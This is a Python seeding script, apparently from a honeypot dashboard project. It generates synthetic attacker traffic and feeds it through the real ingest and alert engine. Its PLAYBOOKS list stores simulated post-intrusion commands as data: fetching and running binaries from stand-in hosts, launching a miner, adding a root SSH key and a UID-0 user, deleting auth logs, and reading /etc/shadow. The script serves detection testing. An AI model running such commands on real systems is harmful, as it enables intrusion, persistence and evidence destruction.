#!/usr/bin/env python3
"""
tools/seed_demo.py — Generate a believable dataset for the dashboard.

    python tools/seed_demo.py                     write demo/honeypot_demo.db
    python tools/seed_demo.py --hours 48          a longer history
    python tools/seed_demo.py --force             overwrite an existing demo db
    python tools/seed_demo.py --db ../other.db    somewhere else entirely

Why this exists: every screen in the dashboard is a read model, so with an empty
database they all correctly render "nothing yet" and none of them can be checked.
This produces a day of honeypot traffic — scanners, brute force, credential
spraying, three attackers who actually get in, and one sensor that goes quiet —
so the screens have something true to show.

Two properties make the output honest rather than decorative:

* **Events go in through the real ingest path.** ``Database.apply_events()``
  validates every one against Baseline v1.3 and derives the sessions from them,
  exactly as the collector does. A generated event that would be rejected in
  production is rejected here too.
* **Alerts are not written directly.** Events are inserted in chronological
  chunks the width of the evaluation window, and the real ``AlertEngine`` runs
  after each chunk — the same passes, thresholds, deduplication and cooldown a
  live deployment performs. Every alert on the dashboard was therefore produced
  by a rule firing, not by this script deciding it should exist.

It writes to its own database file and refuses to overwrite one without
``--force``, so it can never disturb collected data.
"""

from __future__ import annotations

import argparse
import random
import sys
import uuid
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Any, Dict, List

DASHBOARD_DIR = Path(__file__).resolve().parent.parent
REPO_ROOT = DASHBOARD_DIR.parent
sys.path.insert(0, str(REPO_ROOT / "core"))

from common import config  # noqa: E402
from common.db.database import Database  # noqa: E402

TS = "%Y-%m-%dT%H:%M:%SZ"

NODES = list(config.KNOWN_NODES) or ["node-01", "node-02", "node-03"]

NODE_META = {
    "node-01": ("hp-edge-01", "Lab-VM-1", "10.20.0.11"),
    "node-02": ("hp-edge-02", "Lab-VM-2", "10.20.0.12"),
    "node-03": ("hp-dmz-01", "Lab-VM-3", "10.20.0.13"),
}

#: RFC 5737 documentation ranges — the addresses the team's fixtures use, and
#: the ones the enrichment path treats as lookupable rather than private.
NETWORKS = ["203.0.113.", "198.51.100.", "192.0.2."]

GEO = [
    ("CN", "Shanghai", 31.23, 121.47),
    ("RU", "Moscow", 55.75, 37.62),
    ("US", "Ashburn", 39.04, -77.49),
    ("BR", "Sao Paulo", -23.55, -46.63),
    ("NL", "Amsterdam", 52.37, 4.90),
    ("VN", "Hanoi", 21.03, 105.85),
    ("IN", "Mumbai", 19.08, 72.88),
    ("DE", "Frankfurt", 50.11, 8.68),
    ("KR", "Seoul", 37.57, 126.98),
    ("RO", "Bucharest", 44.43, 26.10),
    ("UA", "Kyiv", 50.45, 30.52),
    ("ID", "Jakarta", -6.21, 106.85),
]

USERNAMES = [
    "root", "admin", "test", "user", "oracle", "ubuntu", "pi", "postgres",
    "git", "ftp", "guest", "support", "deploy", "mysql", "www-data", "nagios",
]

PASSWORDS = [
    "123456", "admin", "root", "password", "1234", "P@ssw0rd", "toor",
    "raspberry", "letmein", "qwerty", "12345678", "admin123",
]

PROTOCOLS = ["ssh", "ssh", "ssh", "telnet", "ftp"]

#: Post-authentication behaviour. Each sequence is a plausible session, and each
#: contains commands the alert engine's pattern set will classify.
PLAYBOOKS = [
    {
        "name": "iot-loader",
        "commands": [
            "uname -a", "whoami", "cat /proc/cpuinfo", "free -m",
            "cd /tmp; ls -la",
            "wget http://198.51.100.77/bins/arm7 -O /tmp/.sysd",
            "chmod +x /tmp/.sysd",
            "/tmp/.sysd",
            "history -c",
        ],
        "download": {
            "download_url": "http://198.51.100.77/bins/arm7",
            "file_name": ".sysd",
            "file_hash": "9f2c1b0a4d7e6f38a1c9b5d2e0f7a634c8b1d9e2f4a7c0b3d6e9f2a5c8b1d4e7",
        },
    },
    {
        "name": "miner",
        "commands": [
            "id", "hostname", "cat /etc/passwd", "nproc",
            "curl -o /tmp/kx http://203.0.113.201/kx",
            "chmod 777 /tmp/kx",
            "nohup /tmp/kx --url pool.example.net:3333 &",
            "crontab -l",
        ],
        "download": {
            "download_url": "http://203.0.113.201/kx",
            "file_name": "kx",
            "file_hash": "3a7d9c5e1f8b2064d3e7a9c1b5f8d2e604a7c9b3d1e5f8a2c6b9d3e7f1a5c8b2",
        },
    },
    {
        "name": "persistence",
        "commands": [
            "uname -rv", "whoami",
            "mkdir -p /root/.ssh",
            "echo ssh-rsa AAAAB3Nza... >> /root/.ssh/authorized_keys",
            "useradd -ou 0 -g 0 svcmon",
            "systemctl enable svcmon",
            "rm -rf /var/log/auth.log",
        ],
        "download": None,
    },
    {
        "name": "recon-only",
        "commands": [
            "uname -a", "whoami", "id", "cat /proc/cpuinfo",
            "ls -la /", "cat /etc/shadow", "exit",
        ],
        "download": None,
    },
]


def utc(moment: datetime) -> str:
    return moment.strftime(TS)


def event(node_id, session_id, event_type, moment, attacker_ip, protocol, details):
    """One Baseline v1.3 event envelope, with every field present."""
    return {
        "event_id": str(uuid.uuid4()),
        "node_id": node_id,
        "session_id": session_id,
        "event_type": event_type,
        "timestamp": utc(moment),
        "attacker_ip": attacker_ip,
        "protocol": protocol,
        "details": details,
    }


def session_id(node_id: str) -> str:
    return f"{node_id}:{uuid.uuid4().hex[:8]}"


# --------------------------------------------------------------------------
# Generation
# --------------------------------------------------------------------------

def build_attackers(rng: random.Random, count: int) -> List[Dict[str, Any]]:
    """
    The cast. Weighted so the population looks like a real honeypot's:
    mostly noise, a lot of brute force, a handful who get in.
    """
    kinds = (["scanner"] * 4 + ["bruteforce"] * 5 + ["spray"] * 2 + ["intruder"])
    attackers = []
    used = set()

    for index in range(count):
        while True:
            address = rng.choice(NETWORKS) + str(rng.randint(2, 250))
            if address not in used:
                used.add(address)
                break

        country, city, lat, lon = rng.choice(GEO)
        kind = kinds[index % len(kinds)]
        attackers.append(
            {
                "ip": address,
                "kind": kind,
                "country": country,
                "city": city,
                "lat": lat + rng.uniform(-0.4, 0.4),
                "lon": lon + rng.uniform(-0.4, 0.4),
                "protocol": rng.choice(PROTOCOLS),
                # Reputation is deliberately not uniform: a couple of addresses
                # sit above the high_risk_ip threshold, most sit well below.
                "abuse": {
                    "intruder": rng.randint(72, 100),
                    "bruteforce": rng.randint(28, 88),
                    "spray": rng.randint(35, 80),
                    "scanner": rng.randint(0, 45),
                }[kind],
                "nodes": rng.sample(NODES, k=min(len(NODES), rng.choice([1, 1, 2, 3]))),
            }
        )
    return attackers


def build_session(rng, attacker, node_id, start: datetime) -> List[Dict[str, Any]]:
    """One session's worth of events, told in order."""
    sid = session_id(node_id)
    ip = attacker["ip"]
    protocol = attacker["protocol"]
    events = []
    moment = start

    events.append(event(node_id, sid, "connection", moment, ip, protocol, {
        "destination_ip": NODE_META.get(node_id, ("", "", "10.20.0.1"))[2],
        "destination_port": {"ssh": 22, "telnet": 23, "ftp": 21}.get(protocol, 22),
        "source_port": rng.randint(30000, 61000),
    }))

    kind = attacker["kind"]
    if kind == "scanner":
        moment += timedelta(seconds=rng.randint(1, 4))
        events.append(event(node_id, sid, "session_end", moment, ip, protocol, {
            "status": "closed",
            "duration_seconds": int((moment - start).total_seconds()),
        }))
        return events

    if kind == "spray":
        usernames = rng.sample(USERNAMES, k=rng.randint(6, 11))
        attempts = usernames
    elif kind == "bruteforce":
        usernames = [rng.choice(["root", "admin"])]
        attempts = usernames * rng.randint(6, 26)
    else:  # intruder — persistent, then successful
        usernames = ["root"]
        attempts = usernames * rng.randint(11, 22)

    for username in attempts:
        moment += timedelta(seconds=rng.randint(1, 3))
        events.append(event(node_id, sid, "login_attempt", moment, ip, protocol, {
            "username": username,
            "password": rng.choice(PASSWORDS),
        }))

    if kind != "intruder":
        moment += timedelta(seconds=rng.randint(2, 8))
        events.append(event(node_id, sid, "session_end", moment, ip, protocol, {
            "status": "closed",
            "duration_seconds": int((moment - start).total_seconds()),
        }))
        return events

    moment += timedelta(seconds=rng.randint(2, 5))
    events.append(event(node_id, sid, "login_success", moment, ip, protocol,
                        {"username": "root"}))

    playbook = rng.choice(PLAYBOOKS)
    for index, command in enumerate(playbook["commands"]):
        # A human pauses; a script does not. Give one gap a human's length so the
        # transcript shows the difference.
        moment += timedelta(seconds=rng.randint(2, 9) if index else rng.randint(4, 20))
        if index == 3:
            moment += timedelta(seconds=rng.randint(45, 150))
        events.append(event(node_id, sid, "command", moment, ip, protocol,
                            {"command": command}))

        if playbook["download"] and command.startswith(("wget", "curl")):
            moment += timedelta(seconds=rng.randint(1, 4))
            events.append(event(node_id, sid, "file_download", moment, ip, protocol,
                                dict(playbook["download"])))

    moment += timedelta(seconds=rng.randint(3, 30))
    events.append(event(node_id, sid, "session_end", moment, ip, protocol, {
        "status": "closed",
        "duration_seconds": int((moment - start).total_seconds()),
    }))
    return events


def build_heartbeats(now: datetime, hours: int, quiet_node: str, quiet_minutes: int
                     ) -> List[Dict[str, Any]]:
    """
    A heartbeat per node per contract interval.

    One node stops early on purpose: without a sensor in a degraded state the
    Nodes screen has nothing to demonstrate, and "everything is green" is the
    least informative version of a health page.
    """
    interval = 60
    start = now - timedelta(hours=hours)
    events = []
    for node_id in NODES:
        stop = now - timedelta(minutes=quiet_minutes) if node_id == quiet_node else now
        moment = start
        while moment <= stop:
            events.append({
                "event_id": str(uuid.uuid4()),
                "node_id": node_id,
                "session_id": None,
                "event_type": "heartbeat",
                "timestamp": utc(moment),
                "attacker_ip": None,
                "protocol": None,
                "details": {"status": "ok", "agent_version": "1.3.0"},
            })
            moment += timedelta(seconds=interval)
    return events


def build_events(rng, attackers, now: datetime, hours: int, quiet_node: str
                 ) -> List[Dict[str, Any]]:
    events = build_heartbeats(now, hours, quiet_node, quiet_minutes=9)
    window = hours * 3600

    for attacker in attackers:
        sessions = {
            "scanner": rng.randint(1, 3),
            "bruteforce": rng.randint(2, 5),
            "spray": rng.randint(1, 3),
            "intruder": rng.randint(1, 2),
        }[attacker["kind"]]

        starts = []
        for _ in range(sessions):
            # Bias towards the recent past — a live honeypot is busiest now.
            offset = int(window * (rng.random() ** 1.7))
            start = now - timedelta(seconds=max(90, offset))
            node_id = rng.choice(attacker["nodes"])
            if node_id == quiet_node and start > now - timedelta(minutes=9):
                node_id = NODES[0]
            starts.append(start)
            events.extend(build_session(rng, attacker, node_id, start))

        # Multi-sensor attackers hit a second node *while* the first is still
        # being worked. Simultaneity is the whole point: the multi_node_scan rule
        # counts distinct nodes inside one evaluation window, so a second session
        # an hour later would tell it nothing.
        if len(attacker["nodes"]) > 1 and attacker["kind"] != "scanner":
            other = attacker["nodes"][1]
            if other != quiet_node:
                anchor = rng.choice(starts)
                start = anchor + timedelta(seconds=rng.randint(-90, 90))
                events.extend(build_session(rng, attacker, other, min(start, now)))

    # A few attacks are still under way. Without them every session in the
    # database is closed, and the Sessions screen's 'active' filter, the
    # Overview's live counter and the stale-session sweeper all have nothing to
    # act on — a demo dataset where nothing is happening right now.
    intruders = [a for a in attackers if a["kind"] == "intruder"]
    others = [a for a in attackers if a["kind"] == "bruteforce"]
    live = (rng.sample(intruders, k=min(2, len(intruders)))
            + rng.sample(others, k=min(3, len(others))))
    for attacker in live:
        node_id = next((n for n in attacker["nodes"] if n != quiet_node), NODES[0])
        events.extend(
            build_session(rng, attacker, node_id,
                          now - timedelta(seconds=rng.randint(20, 110)))
        )

    # Anything the narrative pushed past "now" simply has not happened yet.
    # Truncating there is what leaves a handful of sessions genuinely in
    # progress, which is the state the Sessions screen's 'active' filter and the
    # collector's stale-session sweeper both exist to handle.
    horizon = utc(now)
    events = [e for e in events if e["timestamp"] <= horizon]
    events.sort(key=lambda e: e["timestamp"])
    return events


# --------------------------------------------------------------------------
# Loading
# --------------------------------------------------------------------------

def load(db: Database, events: List[Dict[str, Any]], attackers, now: datetime,
         quiet_node: str, run_alerts: bool, verbose: bool) -> Dict[str, Any]:
    from alerting.alert_engine import AlertEngine  # noqa: PLC0415 - needs core on path

    for node_id in NODES:
        hostname, location, address = NODE_META.get(node_id, (node_id, "Lab", None))
        db.upsert_node(node_id, hostname=hostname, location=location, ip_address=address)

    # Reputation first: the enrichment-driven rules need something to read, and
    # in a live system Part 3 is always running ahead of the alert engine.
    for attacker in attackers:
        db.upsert_reputation(
            attacker_ip=attacker["ip"],
            country=attacker["country"],
            city=attacker["city"],
            latitude=round(attacker["lat"], 4),
            longitude=round(attacker["lon"], 4),
            abuse_score=attacker["abuse"],
            source="GeoLite2,AbuseIPDB",
            profile_score=max(
                0, min(100, attacker["abuse"] + (10 if attacker["kind"] == "intruder" else -5))
            ),
            last_updated=utc(now - timedelta(minutes=random.randint(5, 240))),
        )

    engine = AlertEngine(db=db) if run_alerts else None
    window = timedelta(minutes=config.ALERT_WINDOW_MINUTES)

    totals = {"accepted": 0, "duplicates": 0, "rejected": 0}
    alerts_created = 0
    chunk: List[Dict[str, Any]] = []
    boundary = None

    from common.db.validation import parse_timestamp

    def flush():
        nonlocal chunk, alerts_created
        if not chunk:
            return
        result = db.apply_events(chunk)
        for key in totals:
            totals[key] += result[key]
        if engine is not None:
            alerts_created += engine.run_once()["alerts_created"]
        chunk = []

    for index, item in enumerate(events):
        moment = parse_timestamp(item["timestamp"])
        if boundary is None:
            boundary = moment + window
        if moment > boundary:
            flush()
            boundary = moment + window
            if verbose:
                print(f"  {index:>6}/{len(events)} events  |  {alerts_created} alerts",
                      end="\r", flush=True)
        chunk.append(item)
    flush()

    if verbose:
        print(" " * 60, end="\r")

    # Seeding a day of traffic in three seconds leaves every event stamped as
    # having arrived hours late, which makes every ingest-lag figure downstream
    # meaningless. The storage layer's fixture helper rewrites received_at to
    # the delay each event would really have had — and gives the sensor that
    # went quiet a visibly worse one, so its spool drain shows up on Nodes.
    db.rebase_received_at(slow_nodes=[quiet_node])

    # The housekeeping a live deployment runs on a timer.
    offline = db.mark_stale_nodes_offline()
    stale = db.close_stale_sessions()

    return {**totals, "alerts": alerts_created, "nodes_offline": offline,
            "sessions_closed": stale}


# --------------------------------------------------------------------------
# CLI
# --------------------------------------------------------------------------

def main(argv=None) -> int:
    parser = argparse.ArgumentParser(
        prog="seed_demo",
        description="Generate a demo dataset for the dashboard.",
    )
    parser.add_argument("--db", default=str(DASHBOARD_DIR / "demo" / "honeypot_demo.db"),
                        help="database to create (default dashboard/demo/honeypot_demo.db)")
    parser.add_argument("--hours", type=int, default=24, help="history to generate")
    parser.add_argument("--attackers", type=int, default=42, help="distinct attacker IPs")
    parser.add_argument("--seed", type=int, default=1303, help="RNG seed, for reproducibility")
    parser.add_argument("--force", action="store_true", help="overwrite an existing file")
    parser.add_argument("--no-alerts", action="store_true",
                        help="skip the alert engine passes (much faster, no alerts)")
    parser.add_argument("-q", "--quiet", action="store_true")
    args = parser.parse_args(argv)

    target = Path(args.db).expanduser().resolve()
    if target.exists():
        if not args.force:
            print(f"{target} already exists. Pass --force to replace it.", file=sys.stderr)
            return 1
        for suffix in ("", "-wal", "-shm"):
            candidate = Path(str(target) + suffix)
            if candidate.exists():
                candidate.unlink()

    target.parent.mkdir(parents=True, exist_ok=True)

    rng = random.Random(args.seed)
    random.seed(args.seed)
    now = datetime.now(timezone.utc).replace(microsecond=0)
    quiet_node = NODES[-1]

    attackers = build_attackers(rng, args.attackers)
    events = build_events(rng, attackers, now, args.hours, quiet_node)

    if not args.quiet:
        print(f"Generating {len(events):,} events from {len(attackers)} attackers "
              f"over {args.hours}h into {target}")

    db = Database(path=target)
    db.initialize_schema()
    try:
        summary = load(db, events, attackers, now, quiet_node,
                       not args.no_alerts, not args.quiet)
    finally:
        db.close()

    if not args.quiet:
        print(
            f"\nSeeded {summary['accepted']:,} events "
            f"({summary['duplicates']} duplicate, {summary['rejected']} rejected)\n"
            f"  {summary['alerts']} alerts raised by the real rules engine\n"
            f"  {summary['nodes_offline']} node(s) marked offline, "
            f"{summary['sessions_closed']} stale session(s) closed\n"
            f"  '{quiet_node}' was left silent for 9 minutes so the Nodes screen has "
            f"a degraded sensor to show\n\n"
            f"Node health is measured against the wall clock, so the healthy sensors drift\n"
            f"to amber and then red as real time passes. Re-run this before a demo.\n\n"
            f"Run the dashboard against it:\n"
            f"  python main.py --db \"{target}\"\n"
        )
    return 0


if __name__ == "__main__":
    sys.exit(main())
